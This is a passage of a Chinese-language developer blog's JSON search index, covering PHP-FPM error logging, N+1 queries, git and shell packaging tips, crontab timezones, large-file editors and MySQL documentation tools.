","date":"2019-05-26","objectID":"/blog/posts/CSRF-SSRF-XSS%E6%9C%89%E9%97%9C%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%E5%B0%8F%E8%A8%98/:1:0","tags":["CSRF","SSRF","XSS"],"title":"CSRF , SSRF , XSS 有關網頁安全小記","uri":"/blog/posts/CSRF-SSRF-XSS%E6%9C%89%E9%97%9C%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"最近用 docker 使用 portainer 看 log 卻沒有看到我想要的程式錯誤資訊 查了一下 PHP-FPM 預設沒有打開 ** 2019-06-03 ** 這篇 php-fpm 雖然不會記入 log 假如有用 docker 執行的話 可以在 docker 下看 log 不用調整 php-fpm 用 docker 的人可能不需要調整 可詳細 PHP CI 框架不會記錄 ERROR 到 nginx log 裡解決方案 | 程式狂想筆記 ","date":"2019-05-22","objectID":"/blog/posts/PHP-FPM-%E6%89%93%E9%96%8B-error-log-%E6%96%B9%E6%B3%95/:0:0","tags":["php","php-fpm"],"title":"PHP-FPM 打開 error log 方法","uri":"/blog/posts/PHP-FPM-%E6%89%93%E9%96%8B-error-log-%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"PHP-FPM 調整設定 /usr/local/etc/php-fpm.d/www.conf 找到 catch_workers_output 設定，改為 yes ; Redirect worker stdout and stderr into main error log. If not set, stdout and ; stderr will be redirected to /dev/null according to FastCGI specs. ; Default Value: no catch_workers_output = yes XYZ 的筆記本: PHP FPM 錯誤記錄不會寫到 error log ? 修改 php-fpm.conf 文件，添加（或修改）如下配置： [global] error_log = log/error_log \u003c– 這個我沒設定，只設定 catch_workers_output = yes [www] catch_workers_output = yes 修改 php.ini 文件，添加（或修改）如下配置： log_errors = On error_log = “/usr/local/lnmp/php/var/log/error_log” error_reporting=E_ALL\u0026~E_NOTICE 重启 php-fpm 參考來源: 开启 php-fpm 错误日志 ","date":"2019-05-22","objectID":"/blog/posts/PHP-FPM-%E6%89%93%E9%96%8B-error-log-%E6%96%B9%E6%B3%95/:1:0","tags":["php","php-fpm"],"title":"PHP-FPM 打開 error log 方法","uri":"/blog/posts/PHP-FPM-%E6%89%93%E9%96%8B-error-log-%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"設定 PHP Log 小方法 在用 docker PHP-FPM 路徑在/usr/local/etc/php-fpm.d/www.conf 因為我 docker 沒安裝 vi, nano 所以我想用 sed 修改檔案 這時候要把這個文件的 phobia 通通改成 phobe： sed -i -e 's/phobia/phobe/' phobia.txt sed -i -e 's/phobia/phobe/g' phobia.txt sed -i .bak -e 's/phobia/phobe/g' phobia.txt 注意-i 代表 Edit file in-place，也就是直接編輯檔案的意思 第 2 個指令多了一個 g, 代表同一行裡面如果出現多次則通通修改；第 1 個指令只會改掉每一行裡面第一個遇到的 pattern。在 Mac 裡面-i 的行為跟在 Linux 下會不一樣，像是第 3 行的 指令在 Linux 下就只會直接編輯檔案；但在 Mac 下卻會被備份一個檔案後面接著-e 第 3 行指令裡面的-i 後面接.bak 意思為，把原始的檔案多加.bak 存成備份。 阿就操場啊~: sed 直接編輯文件，做文字取代 所以簡單使用 sed -i 's/;catch_workers_output = yes/catch_workers_output = yes/g' www.conf 相關連結 Sed 的常用命令语法备忘【转】 | Henter ","date":"2019-05-22","objectID":"/blog/posts/PHP-FPM-%E6%89%93%E9%96%8B-error-log-%E6%96%B9%E6%B3%95/:2:0","tags":["php","php-fpm"],"title":"PHP-FPM 打開 error log 方法","uri":"/blog/posts/PHP-FPM-%E6%89%93%E9%96%8B-error-log-%E6%96%B9%E6%B3%95/"},{"categories":["程式心法"],"content":"最近在做複雜的 API 由於 PM 覺得某一個 JSON 屬性調整 結果需要改好幾隻程式 API 不過有查到可以使用GraphQL | 一种为你的 API 而生的查询语言 但這篇不是重點在 GraphQL 而是我探索某一篇 阻碍你使用 GraphQL 的十个问题 | 咀嚼之味 它就像是一顆無限向下延伸的樹。所以在我看來，GraphQL 更應該叫 TreeQL，當然在圖論裡，Tree 就是 Graph 也沒毛病啦。需要注意的是，這也會引出 「N + 1 problem」 的話題——naive 的 GraphQL 服務端實現會讓這段 query 變得異常慢！ 看了一下內容，N+1 問題就有像一個查詢每一行執行 SQL 如下 SELECT * FROM `song` LIMIT 0, 20; SELECT * FROM `singer` WHERE `id` = 1; SELECT * FROM `singer` WHERE `id` = 2; SELECT * FROM `singer` WHERE `id` = 3; ... 奇怪，這個怎麼讓我想到 ORM 也是這樣 所以我查了一下 ORM 真的也有這個問題 由於最近也想開使用 ORM ，所以進入前想了解之後使用上會遇到什麼問題 這邊只會先整理 ","date":"2019-05-21","objectID":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/:0:0","tags":["sql","orm"],"title":"有關程式 N+1 問題","uri":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"DataLoader 目前查到資料可以用 DataLoader 方式解決問題 Dataloader 主要有兩項功能： Batching (批次) \u0026 Caching (快取) 。 Batching 在於他能夠將想要進 db 搜尋的 id 都搜集起來，等時間到了一次進 db 搜尋，解決 N + 1 問題。 Caching 在於它在紀錄 id 時會做 memoization ，所以未來若是有重複的 id 進來就會被剔除，保證資料索取數越少越好。 GraphQL Design: 使用 DataLoader 提升效能 ! - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 有爬到這篇有 10000 一筆一筆方式撈出來 得到 用範例程式實際探索 N + 1 query 有多可怕 – Yulin Chen – Medium ","date":"2019-05-21","objectID":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/:1:0","tags":["sql","orm"],"title":"有關程式 N+1 問題","uri":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"Laravel ORM 解決 Laravel 中解決 N + 1 問題 使用預加載功能 使用 with() 方法，會做緩存 with() 中放需要查詢的關聯屬性 總結要點：使用 Laravel 開發工具，ORM 查詢的 N + 1 問題 | Laravel China 社區 - 高品質的 Laravel 開發者社區 ","date":"2019-05-21","objectID":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/:2:0","tags":["sql","orm"],"title":"有關程式 N+1 問題","uri":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"我自己想到的方法 由於 sharding 不能做 join 動作，所以我使用where in (id list)方式查詢 但這種方法程式一寫差錯，可能程式就500了 其中有一篇 Eager Loading，Laravel 的 with 跟這個有關係 ORM 中的 N+1 问题 - google4y - 博客园 ◉ Performance: N+1 Query Problem GraphQL N+1 问题解决方案 | HHF 金字塔 [Rails] N+1 Queries Problem – Dosmanthus – Medium Eloquent: Relationships - Laravel - The PHP Framework For Web Artisans 数据库:django ORM 如何处理 N+1 查询 - 答复哈 - OSCHINA Laravel N+1 Problem @ Neil的部落格 :: 痞客邦 :: ","date":"2019-05-21","objectID":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/:3:0","tags":["sql","orm"],"title":"有關程式 N+1 問題","uri":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"相關連結 Laravel 使用二级缓存提高缓存命中率和内存使用效率 - 探花的 Blog Laravel 在 with 查询中只查询个别字段 | Laravel China 社区 - 高品质的 Laravel 开发者社区 [擴展推薦] Laravel Query Detector 數據模型查詢的 N+1 問題捕殺神器 | Laravel China 社區 - 高品質的 Laravel 開發者社區 在 Laravel 中使用 GraphQL 一【获取数据】 | Laravel China 社区 - 高品质的 Laravel 开发者社区 阻礙你使用 GraphQL 的十個問題 | 咀嚼之味 ","date":"2019-05-21","objectID":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/:3:1","tags":["sql","orm"],"title":"有關程式 N+1 問題","uri":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"其他小記 ","date":"2019-05-21","objectID":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/:4:0","tags":["sql","orm"],"title":"有關程式 N+1 問題","uri":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"GraphQL 小記 TypeORM - 最好的 Node.js ORM 框架 - CNode 技术社区 GraphQL 教程（六）—— N+1 问题和缓存等问题 | 豪翔天下 Using DataLoader with GraphQL: A Concrete Example – codeburst 在 Laravel 中使用 GraphQL 一【获取数据】 | Laravel China 社区 - 高品质的 Laravel 开发者社区 GraphQL Design: 使用 DataLoader 提升效能 ! - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 阻碍你使用 GraphQL 的十个问题 | 咀嚼之味 GraphQL 入門： 簡介 \u0008X 範例 X 優缺點 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 2018 GraphQL 漸進式導入的架構 – Michael Hsu – Medium ","date":"2019-05-21","objectID":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/:4:1","tags":["sql","orm"],"title":"有關程式 N+1 問題","uri":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"sharding 小記 當下還沒有非常令人滿意的基於 hibernate 的 sharding 框架，（關於 hibernate hards 會在下文介紹），因此很多團隊會選擇自行實現 sharding。 原文網址：https://read01.com/AJO2Bm.html Spring 的 DAO 支持 ","date":"2019-05-21","objectID":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/:4:2","tags":["sql","orm"],"title":"有關程式 N+1 問題","uri":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"ftp 小記 因為最近沒時間整理 所以先暫時貼在這 目前可能組put xxx的 ftp 指令內容 最後在sftp \u003c xxx.txt會比較快 List all files in a ftp folder in a text file [ bash ls ] How to upload (FTP) files to server in a bash script? - Stack Overflow bash - Get notified about new files on SFTP server - Ask Ubuntu 用二句 Shell 命令实现 FTP 批量上传文件夹 - linux48 Upload files from a list via ftp in bash - Stack Overflow ","date":"2019-05-21","objectID":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/:4:3","tags":["sql","orm"],"title":"有關程式 N+1 問題","uri":"/blog/posts/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/"},{"categories":["SQL"],"content":"union 要做排序要放在最下面 select seq from ooo union select null as seq from xxx seq 全部都會變成 null 最近太忙了 先記錄到這邊 有空在研究 UNION 中 ORDER By 的使用 - 不要依赖这里 因为你有大脑 - ITeye 博客 ","date":"2019-05-20","objectID":"/blog/posts/SQL-union-%E6%8E%92%E5%BA%8F%E7%9A%84%E5%95%8F%E9%A1%8C/:0:0","tags":["sql","union"],"title":"SQL union 排序的問題","uri":"/blog/posts/SQL-union-%E6%8E%92%E5%BA%8F%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["shell"],"content":"快速打包程式的腳本(shell) | 程式狂想筆記 之前有寫過這篇，再包程式都是固定的程式 有時候公司需要打包只有異動到的檔案 這時候之前寫的程式內容可以修正 但我在想有什麼快速整理 ","date":"2019-05-20","objectID":"/blog/posts/%E5%8F%A6%E9%A1%9E%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85commmit%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/:0:0","tags":["shell"],"title":"另類快速打包commmit程式方法","uri":"/blog/posts/%E5%8F%A6%E9%A1%9E%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85commmit%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/"},{"categories":["shell"],"content":"使用 GIT 抓取異動檔案 git diff --stat 會顯示異動檔案，當然也會有後面的異動行數 git diff head^ --name-only 可抓上次異動的檔案 這時候可以貼到快速打包程式的腳本(shell) | 程式狂想筆記之前的 code ","date":"2019-05-20","objectID":"/blog/posts/%E5%8F%A6%E9%A1%9E%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85commmit%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/:1:0","tags":["shell"],"title":"另類快速打包commmit程式方法","uri":"/blog/posts/%E5%8F%A6%E9%A1%9E%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85commmit%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/"},{"categories":["shell"],"content":"cp 複製檔案 假如複製少許檔案 使用 git diff 抓取少許檔案 為了貼一個檔案，就用腳本工具也挺麻煩 可以直接使用cp指令 在bash - Linux: copy and create destination dir if it does not exist - Stack Overflow有提到用--parents可以解決問題 /tmp $ mkdir foo /tmp $ mkdir foo/foo /tmp $ touch foo/foo/foo.txt /tmp $ mkdir bar /tmp $ cp --parents foo/foo/foo.txt bar /tmp $ ls bar/foo/foo foo.txt 複製檔案範例 cp --parents foo/foo/foo.txt(打包檔案) ~/(打包路徑) #ex cp --parent ooo/xxx.php ~/Desktop 用 Sublime Text 快速貼上也很快 XD ","date":"2019-05-20","objectID":"/blog/posts/%E5%8F%A6%E9%A1%9E%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85commmit%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/:2:0","tags":["shell"],"title":"另類快速打包commmit程式方法","uri":"/blog/posts/%E5%8F%A6%E9%A1%9E%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85commmit%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/"},{"categories":["shell"],"content":"cp 另類複製方法 但有看到 Mac 不能用--parents 有看到一種方法 mkdir -p /foo/bar \u0026\u0026 cp myfile.txt $_ 查了一下，$_這個參數很特別 是抓取前一個指令最後面一個參數 git echo $_ # git ll echo $) #-l (抓取上一個指令最後一個參數，若沒參數就是指令) 所以$_可以做這樣運用 Bash shell script 教學 bash-shell-script-10-638.jpg（JPEG 圖片，638x479 像素） ","date":"2019-05-20","objectID":"/blog/posts/%E5%8F%A6%E9%A1%9E%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85commmit%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/:2:1","tags":["shell"],"title":"另類快速打包commmit程式方法","uri":"/blog/posts/%E5%8F%A6%E9%A1%9E%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85commmit%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/"},{"categories":["shell"],"content":"7z 快速壓縮打包 2019-05-22 用 CP 指令打包，還需要手動作壓縮 今天有找到一個方法 設定 file.txt 可完成快入打包 file.txt xxx/ooo.jpg xxx/ooo.jpg xxx/ooo.jpg now=`date +\"%Y%m%d_%H%M\"` 7z a DestinyTest_$now.7z @file.txt 真的非常方便 相關連結 bash - How do I zip up multiple files on command line? - Ask Ubuntu 7 zip - How to pass multiple files to zip in a single command using 7 zip? - Super User Linux 日期格式 - Shell Script 自訂格式 terminal - create zip based on contents of a file list - Server Fault Can’t using vim editor on console connection with container. · Issue #322 · portainer/portainer ","date":"2019-05-20","objectID":"/blog/posts/%E5%8F%A6%E9%A1%9E%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85commmit%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/:3:0","tags":["shell"],"title":"另類快速打包commmit程式方法","uri":"/blog/posts/%E5%8F%A6%E9%A1%9E%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85commmit%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"之前只會用 Fiddler 做 Android Debug 工具 但當沒有同網段網域的時候，就不會很方便處理問題 前陣子有人推薦用 Android Studio 工具 裡面的 Network 可以看Inspect network traffic with Network Profiler | Android Developers 但感覺…殺雞焉用牛刀 最近聽到 Chrome 插 USB 也能用 Debug!!! 遠程調試 Android 設備使用入門 | Tools for Web Developers | Google Developers 星塵 AskeinG: [分享] 透過 DevTools 在 Android Chrome 除錯 只能說 666，有時間再來筆記 最近太忙 orz 2019-06-25 發現新工具，有時間再來試試 mitmproxy - an interactive HTTPS proxy 如何使用 mitmproxy 來監看手機上的 apps 連線到哪些網站 | 隨便寫寫 ","date":"2019-05-20","objectID":"/blog/posts/Android%E5%9C%A8Chrome%E5%81%9ADebug%E5%B0%81%E5%8C%85%E6%96%B9%E6%B3%95/:0:0","tags":["android","chrome"],"title":"Android在Chrome做Debug封包方法","uri":"/blog/posts/Android%E5%9C%A8Chrome%E5%81%9ADebug%E5%B0%81%E5%8C%85%E6%96%B9%E6%B3%95/"},{"categories":null,"content":"最近因為要設定 crontab 時區 但主機時區不是台灣時間 但程式是台灣時間 但這時候控制排程可能就會有時間差的問題 ","date":"2019-05-16","objectID":"/blog/posts/%E8%A8%AD%E5%AE%9Acrontab%E6%8E%92%E7%A8%8B%E6%99%82%E5%8D%80%E5%B0%8F%E8%A8%98/:0:0","tags":null,"title":"設定crontab排程時區小記","uri":"/blog/posts/%E8%A8%AD%E5%AE%9Acrontab%E6%8E%92%E7%A8%8B%E6%99%82%E5%8D%80%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"在 Linux 設定 方法 其實這時候很簡單，調整時區就能解決問題!! Crontab 能不能調整時區? 答案可以： CentOS7 下 Crontab 时区问题 | MYF ntpdate -u tock.stdtime.gov.tw timedatectl set-timezone Asia/Taipei timedatectl set-local-rtc 0 # Set Real-Time Clock cp -pf /usr/share/zoneinfo/Asia/Taipei /etc/localtime 其他相關 Linux 設定 NTP 同步系統時間，自動網路校時教學 - G. T. Wang 使用 ntpd 來替換 ntpdate 以完成校時的工作 – SZ Lin \u0026 Embedded Linux 可惜！目前專案不太希望我們動到主機時區 orz ","date":"2019-05-16","objectID":"/blog/posts/%E8%A8%AD%E5%AE%9Acrontab%E6%8E%92%E7%A8%8B%E6%99%82%E5%8D%80%E5%B0%8F%E8%A8%98/:1:0","tags":null,"title":"設定crontab排程時區小記","uri":"/blog/posts/%E8%A8%AD%E5%AE%9Acrontab%E6%8E%92%E7%A8%8B%E6%99%82%E5%8D%80%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"設定 bash 環境變數 TZ=‘Asia/Taipei’; export TZ crontab 时区以及 linux 时区设置-luosiyong 這可以改變 Bash 變時區問題 但是 Crontab 還是不會有影響 定时任务 cron 时区的问题 備份圖 /etc/init.d/cron但這邊設定檔好像可以設定 PS:還沒有驗證 6 Online Tools for Generating and Testing Cron Jobs for Linux 其實，PHP CI 的 index.php 連線都有設定台灣時區，DB 連線也有設定 但之後程式可能需要有程式設定 crontab 目前有想到用程式減少相對時區 解決問題 小記 Laravel 設定時區PHPer: Laravel 5 資料庫 timezone 設定 'mysql' =\u003e [ ... 'options' =\u003e [ PDO::MYSQL_ATTR_INIT_COMMAND =\u003e 'SET time_zone = \"+08:00\"' ], (or) 'timezone' =\u003e '+08:00', ], Set default MySQL timezone on connect? | Laravel.io cron - How do you set the timezone for crontab? - Ask Ubuntu ","date":"2019-05-16","objectID":"/blog/posts/%E8%A8%AD%E5%AE%9Acrontab%E6%8E%92%E7%A8%8B%E6%99%82%E5%8D%80%E5%B0%8F%E8%A8%98/:2:0","tags":null,"title":"設定crontab排程時區小記","uri":"/blog/posts/%E8%A8%AD%E5%AE%9Acrontab%E6%8E%92%E7%A8%8B%E6%99%82%E5%8D%80%E5%B0%8F%E8%A8%98/"},{"categories":["寫程式一些事"],"content":"今天 git push 前幾天寫的 blog 內容 收到Discord apikey exposed on GitHub 看了一下信，好像我上傳 apikey 到 github 上面 GitGuardian detected an API key from Discord in the following commit from **** pushed at 2019-05-11T17:52:24Z. GitGuardian, or “GG”, is a “Good Guy” bot scanning in real time GitHub commits for sensitive information. Once you have pushed sensitive information to GitHub, this information is public and should be considered compromised. We just open sourced our GitHub repository to help developers take appropriate actions. Would love a star! :) Accidents happened to the best of us and will continue to happen. Sign up to our service to be notified if this happens again. We got a free tier for individual developers ! 看了一下，我還真的把 discord api key 傳上去 這時候我就用 git rebase 環原去修正裡面內容 先去.deploy_git 裡面下git rebase -i xxxx^ 要修正的 commit 請記得改edit再:wq 修改完內容記得用git rebase --continue 不是下git commit!!!! Git-Tutorials/README.md at master · twtrubiks/Git-Tutorials · GitHub 平常沒什麼機會用到 今天碰到了 XD 不過 hexo deploy 的網頁檔沒有抓到 他是抓到我上傳 markdown 檔案 看來不會對大檔案做簡查 ","date":"2019-05-12","objectID":"/blog/posts/Discord-apikey-exposed-on-GitHub%E4%B8%8D%E5%B0%8F%E5%BF%83%E4%B8%8A%E5%82%B3api-key/:0:0","tags":null,"title":"Discord apikey exposed on GitHub不小心上傳api key","uri":"/blog/posts/Discord-apikey-exposed-on-GitHub%E4%B8%8D%E5%B0%8F%E5%BF%83%E4%B8%8A%E5%82%B3api-key/"},{"categories":["實用工具"],"content":"最近重裝 zsh 就發現沒有 history 查詢功能(往上) 只要登出，就沒有這個很不方便 今天特別 google 一下 只要在~/.zshrc最上面加 HISTSIZE=1000 SAVEHIST=1000 HISTFILE=~/.history 存檔就可以完成設定 參考: A User’s Guide to the Z-Shell Command history in Zsh - Unix \u0026 Linux Stack Exchange ","date":"2019-05-12","objectID":"/blog/posts/Zsh%E8%A8%AD%E5%AE%9A%E9%96%8B%E5%95%9Fcommmand%E7%B4%80%E9%8C%84/:0:0","tags":["zsh"],"title":"Zsh設定開啟commmand紀錄","uri":"/blog/posts/Zsh%E8%A8%AD%E5%AE%9A%E9%96%8B%E5%95%9Fcommmand%E7%B4%80%E9%8C%84/"},{"categories":["實用工具"],"content":"最近要匯入大量 sql 檔案有大到超過 3G Sublime,vscode 都不適合開大檔案 所以網路爬了工具 記錄一下 ","date":"2019-05-11","objectID":"/blog/posts/%E9%96%8B%E5%95%9F%E5%A4%A7%E6%AA%94%E6%A1%88%E7%9A%84%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7PilotEditLite/:0:0","tags":["software"],"title":"開啟大檔案的好用工具PilotEditLite","uri":"/blog/posts/%E9%96%8B%E5%95%9F%E5%A4%A7%E6%AA%94%E6%A1%88%E7%9A%84%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7PilotEditLite/"},{"categories":["實用工具"],"content":"PilotEdit PilotEdit 有免費的!!但超過 400GB 就需要錢了(我有生之年會遇到??) PilotEdit Lite 12.6.0 中文版 - 支援超大檔案的文字編輯軟體 - 阿榮福利味 - 免費軟體下載 不過預設開啟檔案不是 UTF8 可能需要調整一下 編輯→改變檔編碼 可調整編碼 第二個選項一定要勾，第一個選項看你之後開的檔案編碼是不是一樣 假如是的話可以打勾 ","date":"2019-05-11","objectID":"/blog/posts/%E9%96%8B%E5%95%9F%E5%A4%A7%E6%AA%94%E6%A1%88%E7%9A%84%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7PilotEditLite/:1:0","tags":["software"],"title":"開啟大檔案的好用工具PilotEditLite","uri":"/blog/posts/%E9%96%8B%E5%95%9F%E5%A4%A7%E6%AA%94%E6%A1%88%E7%9A%84%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7PilotEditLite/"},{"categories":["實用工具"],"content":"其他工具 EmEditor 要錢!!不是免費的 EmEditor (文字編輯器) – 支持大檔案以及 Unicode 的最佳 Windows 編輯器! windows 下如何查看超大文本文件(5G ) - 知乎 裡面有提到 WINHEX glogg glogg 有時間再用用看 ","date":"2019-05-11","objectID":"/blog/posts/%E9%96%8B%E5%95%9F%E5%A4%A7%E6%AA%94%E6%A1%88%E7%9A%84%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7PilotEditLite/:2:0","tags":["software"],"title":"開啟大檔案的好用工具PilotEditLite","uri":"/blog/posts/%E9%96%8B%E5%95%9F%E5%A4%A7%E6%AA%94%E6%A1%88%E7%9A%84%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7PilotEditLite/"},{"categories":["MySQL"],"content":"今天專案做 mysqldump 時候，遇到#mysql50#...資料表不能備份 等一下，DB 裡面沒有這個資料表 後來我同事再網路找到了原因 都报错，后来发现，mysql 用户的$HOME 目录下有目录.ssh 导致的问题。 mysql 数据库中出现#mysql50#.ssh 处理方法 - 花名:白起 - CSDN 博客 刪除.ssh 資料夾就能解決 這個雷也太… 囧 ","date":"2019-05-10","objectID":"/blog/posts/mysql%E5%82%99%E4%BB%BD%E9%81%87%E5%88%B0-mysql50-%E4%B8%8D%E8%83%BD%E5%8C%AF%E5%87%BA%E7%9A%84%E5%95%8F%E9%A1%8C/:0:0","tags":["mysql"],"title":"mysql備份遇到#mysql50#不能匯出的問題","uri":"/blog/posts/mysql%E5%82%99%E4%BB%BD%E9%81%87%E5%88%B0-mysql50-%E4%B8%8D%E8%83%BD%E5%8C%AF%E5%87%BA%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["Git"],"content":"之前就有類似寫過刪除 remote 分支方法 但今天想開出來紀錄 有時候刪除 remote 分支 但是我發現我本機上面可以看到刪除的分支(git branch -a) 要怎麼解決呢? ","date":"2019-05-09","objectID":"/blog/posts/Git%E5%88%AA%E9%99%A4Rmote-Branch%E6%96%B9%E6%B3%95/:0:0","tags":["git"],"title":"Git刪除Rmote Branch方法","uri":"/blog/posts/Git%E5%88%AA%E9%99%A4Rmote-Branch%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"本機刪除 git branch -d/-D xxx ","date":"2019-05-09","objectID":"/blog/posts/Git%E5%88%AA%E9%99%A4Rmote-Branch%E6%96%B9%E6%B3%95/:1:0","tags":["git"],"title":"Git刪除Rmote Branch方法","uri":"/blog/posts/Git%E5%88%AA%E9%99%A4Rmote-Branch%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"遠端刪除(但還是會殘留在本機) git push origin :cat 詳細：git 刪除遠端(remote)分支和強制 pull 下來分支 | 程式狂想筆記 ","date":"2019-05-09","objectID":"/blog/posts/Git%E5%88%AA%E9%99%A4Rmote-Branch%E6%96%B9%E6%B3%95/:2:0","tags":["git"],"title":"Git刪除Rmote Branch方法","uri":"/blog/posts/Git%E5%88%AA%E9%99%A4Rmote-Branch%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"刪除殘留本機 remote 有時候就是不小心打指令 結果不小心checkout進來，它會新增到我分支 等於又要重新刪除分支 git fetch -p or git fetch –all –prune都可以解決 詳細:關於 Git 刪除 Remote Branch - Yowko’s Notes git 远程修剪,git 修剪,git fetch – prune 等之间的区别是什么 - 代码日志 其他小記: 不修改 commit 內容 --no-edit Why is git prompting me for a post-pull merge commit message? - Stack Overflow git - Commit without setting user.email and user.name - Stack Overflow 顯示 git commit 修程式 git log --name-only How to have git log show filenames like svn log -v - Stack Overflow ","date":"2019-05-09","objectID":"/blog/posts/Git%E5%88%AA%E9%99%A4Rmote-Branch%E6%96%B9%E6%B3%95/:3:0","tags":["git"],"title":"Git刪除Rmote Branch方法","uri":"/blog/posts/Git%E5%88%AA%E9%99%A4Rmote-Branch%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"最近專案很趕 今天收到要把目前所有建立的 table 用成設計書 雖然之前有寫過從 MySQL 裡面直接(select)讀取出文件設計書表格格式 | 程式狂想筆記 但還是查一下有沒有現成，又好看的工具:P 結果找了不多 ","date":"2019-05-09","objectID":"/blog/posts/MySQL%E8%BD%89%E5%87%BADB%E8%A8%AD%E8%A8%88%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:0","tags":["mysql","doc","php"],"title":"MySQL轉出DB設計文件方法","uri":"/blog/posts/MySQL%E8%BD%89%E5%87%BADB%E8%A8%AD%E8%A8%88%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"doc us(Laravel) GitHub - UniSharp/doc-us: A MySQL Schema Documentation Generator for Laravel. Laravel 好用工具，幫你快速生成 MySQL schema 文件 - UniSharp blog 快速繪製 Db Schema(ERD) 的軟體 - DbSchema | Tsung’s Blog ","date":"2019-05-09","objectID":"/blog/posts/MySQL%E8%BD%89%E5%87%BADB%E8%A8%AD%E8%A8%88%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:1:0","tags":["mysql","doc","php"],"title":"MySQL轉出DB設計文件方法","uri":"/blog/posts/MySQL%E8%BD%89%E5%87%BADB%E8%A8%AD%E8%A8%88%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"PHPWORD 使用 PHPWord 產生 MySQL 資料庫結構文件 | hoyo 學習紀錄 http://sandbox.onlinephpfunctions.com/code/c04fc96a535281378127cb498591c5b6136f68fb 有空實際用在來寫… 小記在這邊(應該沒有機會寫) MySQL 快速複製 Table 的方法 | Tsung’s Blog 